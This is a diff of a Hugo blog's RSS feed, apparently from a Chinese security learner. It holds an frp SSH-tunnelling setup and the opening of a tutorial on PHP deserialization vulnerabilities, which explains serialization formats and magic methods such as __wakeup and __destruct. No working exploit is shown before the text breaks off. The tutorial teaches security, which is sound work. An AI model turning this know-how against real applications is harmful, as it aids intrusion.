     /&gt;
   &lt;/div&gt;
   &lt;div
-    class=&#34;hugo-encryptor-cipher-text&#34;
-    data-password=&#34;1.0.g.f&#34;
-    style=&#34;display: none;&#34;
+    class="hugo-encryptor-cipher-text"
+    data-password="1.0.g.f"
+    style="display: none;"
   &gt;
-    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
+    &lt;span style="display: none;"&gt;--- DON'T MODIFY THIS LINE ---&lt;/span&gt;
     &lt;blockquote&gt;
 &lt;p&gt;官方文档：&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bookstack.cn/read/frp/README_zh.md&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;li&gt;&lt;a class="link" href="https://www.bookstack.cn/read/frp/README_zh.md"  target="_blank" rel="noopener"
     &gt;https://www.bookstack.cn/read/frp/README_zh.md&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/fatedier/frp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;li&gt;&lt;a class="link" href="https://github.com/fatedier/frp"  target="_blank" rel="noopener"
     &gt;https://github.com/fatedier/frp&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;服务端ubuntu-2004-64位安装frps&#34;&gt;服务端(ubuntu 20.04 64位)，安装frps&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz
+&lt;h3 id="服务端ubuntu-2004-64位安装frps"&gt;服务端(ubuntu 20.04 64位)，安装frps&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;wget https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz
 tar -zxvf frp_0.37.1_linux_amd64.tar.gz
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;服务端配置-frpsini&#34;&gt;服务端配置 frps.ini&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[common]
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="服务端配置-frpsini"&gt;服务端配置 frps.ini&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;[common]
 bind_port = 7000
 bind_udp_port = 7001
 token = xxxxxxxx
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;受控端ubuntu-2004-64位安装frpc&#34;&gt;受控端(ubuntu 20.04 64位)安装frpc&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="受控端ubuntu-2004-64位安装frpc"&gt;受控端(ubuntu 20.04 64位)安装frpc&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;wget https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz
 tar -zxvf frp_0.37.1_linux_amd64.tar.gz
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;受控端配置-frpcini&#34;&gt;受控端配置 frpc.ini&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[common]
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="受控端配置-frpcini"&gt;受控端配置 frpc.ini&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;[common]
 server_addr = 1.1.1.1
 server_port = 7000
 token = xxxxxxxx
@@ -712,11 +709,11 @@ use_encryption = true
 use_compression = true
 local_ip = 192.168.1.112
 local_port = 22
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;控制端m1-air安装frpc&#34;&gt;控制端(m1 air)安装frpc&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;brew info frpc # 安装前查看版本是否一致
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="控制端m1-air安装frpc"&gt;控制端(m1 air)安装frpc&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;brew info frpc # 安装前查看版本是否一致
 brew install frpc
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;控端端配置-frpcini&#34;&gt;控端端配置 frpc.ini&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[common]
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="控端端配置-frpcini"&gt;控端端配置 frpc.ini&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;[common]
 server_addr = 1.1.1.1
 server_port = 7000
 token = xxxxxxxx
@@ -734,16 +731,15 @@ bind_port = 44444
 
   &lt;/div&gt;
 &lt;/div&gt;</description>
-        </item>
-        <item>
-        <title>Php反序列化原理</title>
-        <link>https://fragrant1001.github.io/post/2023/phpunserialize/</link>
-        <pubDate>Fri, 14 May 2021 21:36:49 +0800</pubDate>
-        
-        <guid>https://fragrant1001.github.io/post/2023/phpunserialize/</guid>
-        <description>&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0cover.jpg" alt="Featured image of post Php反序列化原理" /&gt;&lt;p&gt;php反序列化深度学习&lt;/p&gt;
-&lt;h2 id=&#34;序列化与反序列化&#34;&gt;序列化与反序列化&lt;/h2&gt;
-&lt;h3 id=&#34;序列化&#34;&gt;序列化&lt;/h3&gt;
+</item>
+<item>
+<title>Php反序列化原理</title>
+<link>https://fragrant1001.github.io/post/2023/phpunserialize/</link>
+<pubDate>Fri, 14 May 2021 21:36:49 +0800</pubDate>
+<guid>https://fragrant1001.github.io/post/2023/phpunserialize/</guid>
+<description>&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0cover.jpg" alt="Featured image of post Php反序列化原理" /&gt;&lt;p&gt;php反序列化深度学习&lt;/p&gt;
+&lt;h2 id="序列化与反序列化"&gt;序列化与反序列化&lt;/h2&gt;
+&lt;h3 id="序列化"&gt;序列化&lt;/h3&gt;
 &lt;p&gt;serialize — 产生一个可存储的值的表示&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。&lt;/p&gt;
@@ -753,45 +749,45 @@ bind_port = 44444
 &lt;/blockquote&gt;
 &lt;p&gt;我们先看几个例子：&lt;/p&gt;
 &lt;p&gt;普通字符串变量序列化&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 $test = &amp;#39;123456&amp;#39;;
 $result = serialize($test);
 echo $result;
 ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58.png&#34;
-	width=&#34;1040&#34;
-	height=&#34;254&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58_huaf7e274e1f6a96d4e37aacdac2a90cef_27975_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58_huaf7e274e1f6a96d4e37aacdac2a90cef_27975_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58.png"
+	width="1040"
+	height="254"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58_huaf7e274e1f6a96d4e37aacdac2a90cef_27975_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-17-03-58_huaf7e274e1f6a96d4e37aacdac2a90cef_27975_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;409&#34;
-		data-flex-basis=&#34;982px&#34;
+		class="gallery-image" 
+		data-flex-grow="409"
+		data-flex-basis="982px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;数组变量序列化&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 $arr = [
     &amp;#34;foo&amp;#34; =&amp;gt; &amp;#34;bar&amp;#34;,
     &amp;#34;bar&amp;#34; =&amp;gt; &amp;#34;foo&amp;#34;,
 ];
 $result = serialize($arr);
 print_r($result);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03.png&#34;
-	width=&#34;1174&#34;
-	height=&#34;328&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03_hu49cd0b57c28bab4bdd2e3e88816fb73d_34136_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03_hu49cd0b57c28bab4bdd2e3e88816fb73d_34136_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03.png"
+	width="1174"
+	height="328"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03_hu49cd0b57c28bab4bdd2e3e88816fb73d_34136_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-09-03_hu49cd0b57c28bab4bdd2e3e88816fb73d_34136_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;357&#34;
-		data-flex-basis=&#34;859px&#34;
+		class="gallery-image" 
+		data-flex-grow="357"
+		data-flex-basis="859px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;对象变量序列化&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 
 class test{
     public $name = &amp;#34;zhangsan&amp;#34;;
@@ -800,40 +796,40 @@ class test{
 $obj = new test();
 $result = serialize($obj);
 print_r($result);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25.png&#34;
-	width=&#34;1149&#34;
-	height=&#34;339&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25_hu58bf8c12ee3eb7d7a07176795b42bce2_41759_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25_hu58bf8c12ee3eb7d7a07176795b42bce2_41759_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25.png"
+	width="1149"
+	height="339"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25_hu58bf8c12ee3eb7d7a07176795b42bce2_41759_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-13-25_hu58bf8c12ee3eb7d7a07176795b42bce2_41759_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;338&#34;
-		data-flex-basis=&#34;813px&#34;
+		class="gallery-image" 
+		data-flex-grow="338"
+		data-flex-basis="813px"
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49.png&#34;
-	width=&#34;899&#34;
-	height=&#34;409&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49_hu8457b1875a35b58d0acc0a94dac6ffcd_26645_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49_hu8457b1875a35b58d0acc0a94dac6ffcd_26645_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49.png"
+	width="899"
+	height="409"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49_hu8457b1875a35b58d0acc0a94dac6ffcd_26645_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-15-49_hu8457b1875a35b58d0acc0a94dac6ffcd_26645_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;219&#34;
-		data-flex-basis=&#34;527px&#34;
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="527px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;可见几乎所有正确的变量都可以被序列化成字符串然后保存下来&lt;/p&gt;
 &lt;p&gt;序列化一个对象后将会保存对象的所有变量，并且发现序列化后的结果都有一个字符，这些字符都是以下字母的缩写。&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;a - array                  b - boolean  
+&lt;pre tabindex="0"&gt;&lt;code&gt;a - array                  b - boolean  
 d - double                 i - integer
 o - common object          r - reference
 s - string                 C - custom object
 O - class                  N - null
 R - pointer reference      U - unicode string
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不同权限的属性序列化情况(public、protected、private)&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 
 class test{
     public $name = &amp;#34;zhangsan&amp;#34;;
@@ -843,16 +839,16 @@ class test{
 $obj = new test();
 $result = serialize($obj);
 print_r($result);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16.png&#34;
-	width=&#34;1280&#34;
-	height=&#34;374&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16_hu49578a99e57fcc5a95084f47432fcc80_42215_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16_hu49578a99e57fcc5a95084f47432fcc80_42215_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16.png"
+	width="1280"
+	height="374"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16_hu49578a99e57fcc5a95084f47432fcc80_42215_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-24-16_hu49578a99e57fcc5a95084f47432fcc80_42215_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;342&#34;
-		data-flex-basis=&#34;821px&#34;
+		class="gallery-image" 
+		data-flex-grow="342"
+		data-flex-basis="821px"
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;这里介绍一下public、private、protected的区别(区别常见于字符串逃逸类型题目)&lt;/p&gt;
@@ -869,7 +865,7 @@ print_r($result);
 &lt;blockquote&gt;
 &lt;p&gt;这样就发现本来是sex结果上面出现的是testsex，而且testsex长度为7，但是上面显示的是9，同样查找资料后发现private属性序列化的时候格式是%00类名%00成员名，%00占一个字节长度，所以sex加了类名后变成了testsex长度为9&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h3 id=&#34;反序列化&#34;&gt;反序列化&lt;/h3&gt;
+&lt;h3 id="反序列化"&gt;反序列化&lt;/h3&gt;
 &lt;p&gt;unserialize — 从已存储的表示中创建 PHP 的值&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。
@@ -877,58 +873,58 @@ print_r($result);
 &lt;p&gt;若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;我们再看几个例子：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 $b = &amp;#39;s:6:&amp;#34;123456&amp;#34;;&amp;#39;;
 $b1 = unserialize($b);
 print_r($b1);
 ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59.png&#34;
-	width=&#34;1054&#34;
-	height=&#34;263&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59_hu6d42f3e9e52fdfc013f0def87bd37ace_27083_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59_hu6d42f3e9e52fdfc013f0def87bd37ace_27083_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59.png"
+	width="1054"
+	height="263"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59_hu6d42f3e9e52fdfc013f0def87bd37ace_27083_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-43-59_hu6d42f3e9e52fdfc013f0def87bd37ace_27083_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;400&#34;
-		data-flex-basis=&#34;961px&#34;
+		class="gallery-image" 
+		data-flex-grow="400"
+		data-flex-basis="961px"
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 $b = &amp;#39;a:2:{s:3:&amp;#34;foo&amp;#34;;s:3:&amp;#34;bar&amp;#34;;s:3:&amp;#34;bar&amp;#34;;s:3:&amp;#34;foo&amp;#34;;}&amp;#39;;
 $b1 = unserialize($b);
 print_r($b1);
 ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55.png&#34;
-	width=&#34;1027&#34;
-	height=&#34;367&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55_hueddc36bc43b967170dd527f2d09e1b1f_32656_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55_hueddc36bc43b967170dd527f2d09e1b1f_32656_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55.png"
+	width="1027"
+	height="367"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55_hueddc36bc43b967170dd527f2d09e1b1f_32656_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-44-55_hueddc36bc43b967170dd527f2d09e1b1f_32656_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;279&#34;
-		data-flex-basis=&#34;671px&#34;
+		class="gallery-image" 
+		data-flex-grow="279"
+		data-flex-basis="671px"
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 $b = &amp;#39;O:4:&amp;#34;test&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:8:&amp;#34;zhangsan&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:10;}&amp;#39;;
 $b1 = unserialize($b);
 print_r($b1);
 ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20.png&#34;
-	width=&#34;1051&#34;
-	height=&#34;412&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20_hu41be456cebeb10dbc43a554c101405f4_45533_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20_hu41be456cebeb10dbc43a554c101405f4_45533_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20.png"
+	width="1051"
+	height="412"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20_hu41be456cebeb10dbc43a554c101405f4_45533_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-46-20_hu41be456cebeb10dbc43a554c101405f4_45533_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;255&#34;
-		data-flex-basis=&#34;612px&#34;
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="612px"
 	
 &gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 
 class test{
     public $name = &amp;#34;zhangsan&amp;#34;;
@@ -939,22 +935,22 @@ $b = &amp;#39;O:4:&amp;#34;test&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:8:&amp;
 $b1 = unserialize($b);
 print_r($b1);
 ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09.png&#34;
-	width=&#34;1052&#34;
-	height=&#34;434&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09_hu169c0b2c05f7dce3be40cfa9cf158e9c_38624_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09_hu169c0b2c05f7dce3be40cfa9cf158e9c_38624_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09.png"
+	width="1052"
+	height="434"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09_hu169c0b2c05f7dce3be40cfa9cf158e9c_38624_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-19-18-48-09_hu169c0b2c05f7dce3be40cfa9cf158e9c_38624_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;242&#34;
-		data-flex-basis=&#34;581px&#34;
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="581px"
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;反序列化漏洞产生原理&#34;&gt;反序列化漏洞产生原理&lt;/h2&gt;
+&lt;h2 id="反序列化漏洞产生原理"&gt;反序列化漏洞产生原理&lt;/h2&gt;
 &lt;p&gt;因为存在大量的魔术方法、参数的传递、不安全函数的使用导致漏洞的产生&lt;/p&gt;
 &lt;p&gt;常见魔术方法&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;__construct()当一个对象创建时被调用
+&lt;pre tabindex="0"&gt;&lt;code&gt;__construct()当一个对象创建时被调用
 
 __destruct()当一个对象销毁时被调用
 
@@ -964,53 +960,53 @@ __sleep() 在对象在被序列化之前运行，常用与过滤
 
 __wakeup() 将在反序列化之前立即被调用，常用与初始化
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看看这几个魔术方法的执行顺序&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hacked by fra&amp;#39;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hacked by fra2&amp;#39;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pt&lt;/span&gt;(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __construct(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__construct&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__destruct&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
